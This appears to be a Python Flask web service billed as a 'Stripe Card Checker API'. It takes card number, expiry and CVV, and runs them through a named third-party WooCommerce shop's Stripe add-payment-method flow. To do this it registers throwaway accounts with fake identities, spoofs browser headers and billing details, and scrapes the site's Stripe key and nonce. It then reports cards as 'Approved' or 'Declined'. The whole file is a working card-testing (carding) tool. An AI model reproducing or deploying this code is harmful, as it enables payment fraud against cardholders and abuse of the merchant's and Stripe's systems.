from flask import Flask, request, jsonify, Response
import requests
import re
import os
import json
import random
from faker import Faker
from bs4 import BeautifulSoup
from functools import wraps
import logging
from datetime import datetime
import urllib.parse

app = Flask(__name__)
fake = Faker()

# Configuration
DOMAIN = "https://www.epicalarc.com"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def handle_errors(f):
    """Decorator to handle errors in API endpoints"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except Exception as e:
            logger.error(f"Error in {f.__name__}: {str(e)}", exc_info=True)
            return jsonify({
                "status": "error",
                "message": str(e),
                "time": datetime.now().isoformat()
            }), 500
    return decorated_function

def parse_card_input(card_input):
    """Parse card input in format: nn|mm|YY|cvv"""
    try:
        parts = card_input.split("|")
        if len(parts) != 4:
            raise ValueError("Invalid card format. Expected: nn|mm|YY|cvv")
        
        card = parts[0].strip()
        month = parts[1].strip()
        year = parts[2].strip()
        cvv = parts[3].strip()
        
        # Validate
        if not card.isdigit() or len(card) < 13:
            raise ValueError("Invalid card number")
        if not month.isdigit() or not (1 <= int(month) <= 12):
            raise ValueError("Invalid month (01-12)")
        if not year.isdigit() or len(year) not in [2, 4]:
            raise ValueError("Invalid year format (YY or YYYY)")
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            raise ValueError("Invalid CVV (3-4 digits)")
        
        # Convert year to 4 digits if needed
        if len(year) == 2:
            current_year_short = datetime.now().year % 100
            year = f"20{year}" if int(year) >= current_year_short else f"19{year}"
        
        return {
            "card_number": card,
            "exp_month": month,
            "exp_year": year,
            "cvv": cvv,
            "last4": card[-4:]
        }
    except Exception as e:
        raise ValueError(f"Card parsing error: {str(e)}")

def generate_user():
    """Generate fake user data"""
    fname = fake.first_name().lower()
    lname = fake.last_name().lower()
    email = f"{fname}{lname}{random.randint(1000,9999)}@example.com"
    password = fake.password(length=10, special_chars=True)
    return {
        "first_name": fname,
        "last_name": lname,
        "email": email,
        "password": password,
        "username": email
    }

def create_session():
    """Create a new requests session with headers"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": fake.user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    })
    return session

def register_user(session):
    """Register a new user"""
    try:
        user_data = generate_user()
        logger.info(f"Registering user: {user_data['email']}")
        
        # Get registration page
        res = session.get(f"{DOMAIN}/my-account/", timeout=10)
        res.raise_for_status()
        
        soup = BeautifulSoup(res.text, "html.parser")
        
        # Extract nonce and referer
        nonce_input = soup.find("input", {"name": "woocommerce-register-nonce"})
        referer_input = soup.find("input", {"name": "_wp_http_referer"})
        
        if not nonce_input:
            logger.error("Could not find woocommerce-register-nonce")
            return False
        
        nonce = nonce_input.get("value", "")
        referer = referer_input.get("value", "/my-account/") if referer_input else "/my-account/"
        
        # Prepare registration data
        data = {
            "username": user_data["username"],
            "email": user_data["email"],
            "password": user_data["password"],
            "register": "Register",
            "woocommerce-register-nonce": nonce,
            "_wp_http_referer": referer,
        }
        
        headers = {
            "Origin": DOMAIN,
            "Referer": f"{DOMAIN}/my-account/",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        # Submit registration
        response = session.post(
            f"{DOMAIN}/my-account/",
            headers=headers,
            data=data,
            allow_redirects=True,
            timeout=10
        )
        
        # Check if registration was successful
        if response.status_code == 200 and ("my-account" in response.url or "dashboard" in response.text):
            logger.info(f"Successfully registered user: {user_data['email']}")
            return True
        else:
            logger.warning(f"Registration might have failed for {user_data['email']}")
            # Continue anyway as the session might still work
            return True
            
    except Exception as e:
        logger.error(f"Registration error: {str(e)}")
        return False

def get_stripe_key_and_nonce(session):
    """Extract Stripe public key and nonce from page"""
    try:
        res = session.get(f"{DOMAIN}/my-account/add-payment-method/", timeout=10)
        res.raise_for_status()
        html = res.text
        
        # Extract Stripe public key
        stripe_pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
        stripe_pk = stripe_pk_match.group(0) if stripe_pk_match else None
        
        # Extract nonce
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
        if nonce_match:
            nonce = nonce_match.group(1)
        else:
            # Try alternative pattern
            nonce_match = re.search(r'var wc_stripe_params = ({.*?});', html, re.DOTALL)
            if nonce_match:
                try:
                    params = json.loads(nonce_match.group(1))
                    nonce = params.get("createAndConfirmSetupIntentNonce")
                except:
                    nonce = None
        
        if not stripe_pk:
            logger.error("Stripe public key not found")
        if not nonce:
            logger.error("Nonce not found")
            
        return stripe_pk, nonce
        
    except Exception as e:
        logger.error(f"Failed to extract Stripe credentials: {str(e)}")
        return None, None

def create_payment_method(stripe_pk, card_data):
    """Create Stripe payment method"""
    try:
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": fake.user_agent(),
        }
        
        # Get billing address from Faker
        billing_address = {
            "postal_code": fake.postcode(),
            "country": "US",
            "state": fake.state_abbr(),
            "city": fake.city(),
            "line1": fake.street_address(),
        }
        
        data = {
            "type": "card",
            "card[number]": card_data["card_number"],
            "card[cvc]": card_data["cvv"],
            "card[exp_year]": card_data["exp_year"][-2:],  # Use last 2 digits of year
            "card[exp_month]": card_data["exp_month"],
            "billing_details[address][postal_code]": billing_address["postal_code"],
            "billing_details[address][country]": billing_address["country"],
            "billing_details[address][state]": billing_address["state"],
            "billing_details[address][city]": billing_address["city"],
            "billing_details[address][line1]": billing_address["line1"],
            "billing_details[name]": f"{fake.first_name()} {fake.last_name()}",
            "billing_details[email]": fake.email(),
            "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
            "key": stripe_pk,
            "_stripe_version": "2024-06-20",
        }
        
        response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            timeout=30
        )
        
        response_data = response.json()
        
        if response.status_code == 200 and "id" in response_data:
            logger.info(f"Payment method created: {response_data['id'][:8]}...")
            return response_data["id"]
        else:
            error_msg = response_data.get("error", {}).get("message", "Unknown error")
            logger.error(f"Payment method creation failed: {error_msg}")
            return None
            
    except Exception as e:
        logger.error(f"Payment method creation error: {str(e)}")
        return None

def confirm_setup(session, pm_id, nonce):
    """Confirm setup intent"""
    try:
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Origin": DOMAIN,
            "Referer": f"{DOMAIN}/my-account/add-payment-method/",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": fake.user_agent(),
        }
        
        data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }
        
        response = session.post(
            f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers,
            data=data,
            timeout=30
        )
        
        return response.text
        
    except Exception as e:
        logger.error(f"Confirm setup error: {str(e)}")
        return json.dumps({"success": False, "error": str(e)})

@app.route('/ch', methods=['GET'])
@handle_errors
def check_card():
    """
    API endpoint to check card via Stripe auth
    Format: /ch?card=nn|mm|YY|cvv
    """
    # Get card parameter
    card_input = request.args.get('card')
    
    if not card_input:
        return jsonify({
            "status": "error",
            "message": "No card provided. Use format: /ch?card=nn|mm|YY|cvv",
            "example": "/ch?card=4242424242424242|12|2025|123"
        }), 400
    
    # Parse card input
    try:
        card_data = parse_card_input(card_input)
        logger.info(f"Processing card: {card_data['last4']}")
    except ValueError as e:
        return jsonify({
            "status": "error",
            "message": str(e),
            "format": "nn|mm|YY|cvv",
            "example": "4242424242424242|12|2025|123"
        }), 400
    
    # Create new session
    session = create_session()
    
    # Step 1: Register user
    logger.info("Step 1: Registering user...")
    if not register_user(session):
        return jsonify({
            "status": "error",
            "message": "Failed to register user session",
            "card_last4": card_data["last4"]
        }), 500
    
    # Step 2: Get Stripe credentials
    logger.info("Step 2: Getting Stripe credentials...")
    stripe_pk, nonce = get_stripe_key_and_nonce(session)
    
    if not stripe_pk or not nonce:
        return jsonify({
            "status": "error",
            "message": "Failed to get Stripe credentials from website",
            "card_last4": card_data["last4"]
        }), 500
    
    # Step 3: Create payment method
    logger.info("Step 3: Creating payment method...")
    pm_id = create_payment_method(stripe_pk, card_data)
    
    if not pm_id:
        return jsonify({
            "status": "declined",
            "message": "Card declined by Stripe",
            "card_last4": card_data["last4"],
            "gateway": "Stripe"
        }), 400
    
    # Step 4: Confirm setup
    logger.info("Step 4: Confirming setup intent...")
    result_text = confirm_setup(session, pm_id, nonce)
    
    # Parse result
    try:
        result = json.loads(result_text)
        
        if result.get("success") and result.get("data", {}).get("status") == "succeeded":
            setup_intent = result["data"].get("id", "N/A")
            client_secret = result["data"].get("client_secret", "N/A")
            
            response_data = {
                "status": "approved",
                "message": "Card successfully authenticated",
                "card_last4": card_data["last4"],
                "setup_intent": setup_intent,
                "client_secret": client_secret[:20] + "..." if client_secret != "N/A" else "N/A",
                "gateway": "Stripe Auth",
                "timestamp": datetime.now().isoformat(),
                "response": "CHARGED"
            }
            
            # Return in multiple formats
            accept_header = request.headers.get('Accept', '')
            
            if 'text/plain' in accept_header:
                # Plain text response (like original script)
                text_response = f"""
Status :- Approved  
Setupintent :- {setup_intent}  
gateway :- Stripe Auth 
Card :- {card_data['last4']}
Response :- CHARGED
"""
                return Response(text_response, mimetype='text/plain')
            else:
                # JSON response
                return jsonify(response_data)
                
        else:
            error_msg = result.get("data", {}).get("message", "Unknown error")
            
            response_data = {
                "status": "declined",
                "message": error_msg,
                "card_last4": card_data["last4"],
                "gateway": "Stripe Auth",
                "timestamp": datetime.now().isoformat(),
                "response": "DECLINED"
            }
            
            return jsonify(response_data), 400
            
    except json.JSONDecodeError:
        # If response is not JSON, return as text
        return jsonify({
            "status": "error",
            "message": "Invalid response from server",
            "raw_response": result_text[:500] if len(result_text) > 500 else result_text,
            "card_last4": card_data["last4"]
        }), 500

@app.route('/', methods=['GET'])
def home():
    """Home page with instructions"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Stripe Card Checker API</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 800px;
                margin: 0 auto;
                padding: 20px;
                background: #f5f5f5;
            }
            .container {
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            h1 {
                color: #333;
                border-bottom: 2px solid #4CAF50;
                padding-bottom: 10px;
            }
            code {
                background: #f4f4f4;
                padding: 2px 6px;
                border-radius: 4px;
                font-family: monospace;
            }
            .endpoint {
                background: #e8f5e9;
                padding: 15px;
                border-left: 4px solid #4CAF50;
                margin: 15px 0;
            }
            .success {
                color: #4CAF50;
                font-weight: bold;
            }
            .error {
                color: #f44336;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔒 Stripe Card Checker API</h1>
            
            <div class="endpoint">
                <h2>📋 Endpoint</h2>
                <code>GET /ch?card=nn|mm|YY|cvv</code>
            </div>
            
            <h2>📝 Format</h2>
            <p><code>card_number|exp_month|exp_year|cvv</code></p>
            
            <h2>🎯 Example</h2>
            <p>
                <code>/ch?card=4242424242424242|12|2025|123</code>
            </p>
            
            <h2>✅ Test Cards</h2>
            <ul>
                <li><code>4242424242424242|12|2025|123</code> - Success</li>
                <li><code>4000000000000002|12|2025|123</code> - Declined</li>
                <li><code>4000000000009995|12|2025|123</code> - Insufficient funds</li>
            </ul>
            
            <h2>📤 Response Formats</h2>
            <p><strong>JSON:</strong> Default response</p>
            <p><strong>Text:</strong> Add <code>Accept: text/plain</code> header</p>
            
            <h2>📊 Status Codes</h2>
            <ul>
                <li><span class="success">200</span> - Approved</li>
                <li><span class="error">400</span> - Declined/Invalid input</li>
                <li><span class="error">500</span> - Server error</li>
            </ul>
            
            <h2>⚡ Quick Test</h2>
            <p>Try this test request:</p>
            <code>curl "http://localhost:5000/ch?card=4242424242424242|12|2025|123"</code>
            
            <h2>📞 Contact</h2>
            <p>For issues or questions, check the logs or contact administrator.</p>
        </div>
    </body>
    </html>
    """
    return html

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "service": "stripe-card-checker",
        "version": "1.0.0"
    })

@app.route('/test', methods=['GET'])
def test_page():
    """Test page with form"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Test Card Checker</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            form { max-width: 400px; }
            input, button { 
                width: 100%; 
                padding: 10px; 
                margin: 5px 0; 
                box-sizing: border-box;
            }
            .result { 
                margin-top: 20px; 
                padding: 15px; 
                border-radius: 5px; 
                display: none;
            }
            .success { background: #d4edda; color: #155724; }
            .error { background: #f8d7da; color: #721c24; }
        </style>
    </head>
    <body>
        <h1>Test Card Checker</h1>
        <form id="cardForm">
            <input type="text" name="card" placeholder="4242424242424242|12|2025|123" required>
            <button type="submit">Check Card</button>
        </form>
        <div id="result" class="result"></div>
        
        <script>
            document.getElementById('cardForm').onsubmit = async function(e) {
                e.preventDefault();
                const card = document.querySelector('input[name="card"]').value;
                const resultDiv = document.getElementById('result');
                
                resultDiv.style.display = 'none';
                resultDiv.className = 'result';
                
                try {
                    const response = await fetch(`/ch?card=${encodeURIComponent(card)}`);
                    const data = await response.json();
                    
                    resultDiv.innerHTML = `
                        <h3>Result: ${data.status.toUpperCase()}</h3>
                        <p><strong>Message:</strong> ${data.message}</p>
                        <p><strong>Card:</strong> ****${data.card_last4}</p>
                        <p><strong>Gateway:</strong> ${data.gateway}</p>
                        <p><strong>Time:</strong> ${data.timestamp}</p>
                    `;
                    
                    resultDiv.className += response.ok ? ' success' : ' error';
                    resultDiv.style.display = 'block';
                    
                } catch (error) {
                    resultDiv.innerHTML = `<h3>Error</h3><p>${error.message}</p>`;
                    resultDiv.className += ' error';
                    resultDiv.style.display = 'block';
                }
            };
        </script>
    </body>
    </html>
    """
    return html

if __name__ == '__main__':
    # Run Flask app
    print("""
    ╔═══════════════════════════════════════╗
    ║   Stripe Card Checker API Running     ║
    ╚═══════════════════════════════════════╝
    
    📍 Endpoint: GET /ch?card=nn|mm|YY|cvv
    🌐 Homepage: http://localhost:5000
    🔧 Test Page: http://localhost:5000/test
    ❤️  Health: http://localhost:5000/health
    
    📝 Example: http://localhost:5000/ch?card=4242424242424242|12|2025|123
    """)
    
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
